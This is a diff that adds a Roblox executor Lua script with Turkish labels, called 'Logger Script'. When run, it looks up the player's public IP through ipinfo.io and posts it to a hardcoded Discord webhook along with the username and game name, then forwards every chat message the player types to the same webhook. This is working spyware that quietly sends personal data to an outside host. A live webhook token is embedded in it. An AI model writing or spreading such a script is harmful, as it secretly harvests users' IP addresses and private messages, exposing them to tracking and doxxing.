@@ -1,0 +1,68 @@
+local webhookURL = "https://discord.com/api/webhooks/1388507401065336953/wllucY4LWNucVktIYOV2hZU4a4sTTA7BgWfAcySTJEFXdJkx_6SbvEy4jo39fFpfEFyC"
+
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local placeId = game.PlaceId
+local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
+local HttpService = game:GetService("HttpService")
+
+local requestFunc = (syn and syn.request) or (http and http.request) or (request or function() error("No request function available") end)
+
+local function sendWebhook(data)
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    pcall(function()
+        requestFunc({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+    end)
+end
+
+local function getPublicIP()
+    local ip = "Bilinmiyor"
+    pcall(function()
+        local response = requestFunc({Url = "https://ipinfo.io/json", Method = "GET"})
+        ip = HttpService:JSONDecode(response.Body).ip or ip
+    end)
+    return ip
+end
+
+local publicIP = getPublicIP()
+
+local data = {
+    content = "",
+    embeds = {{
+        title = "Roblox Executor Log",
+        color = 0x3498db,
+        fields = {
+            {name = "Kullanıcı Adı", value = playerName, inline = true},
+            {name = "Oyun Adı", value = placeName, inline = true},
+            {name = "Place ID", value = tostring(placeId), inline = true},
+            {name = "IP Adresi", value = publicIP, inline = false},
+        },
+        footer = {text = "Logger Script"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+sendWebhook(data)
+
+player.Chatted:Connect(function(message)
+    local chatData = {
+        content = "",
+        embeds = {{
+            title = "Chat Message",
+            color = 0x95a5a6,
+            fields = {
+                {name = "Kullanıcı Adı", value = playerName, inline = true},
+                {name = "Mesaj", value = message, inline = false},
+            },
+            footer = {text = "Logger Script"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    sendWebhook(chatData)
+end)
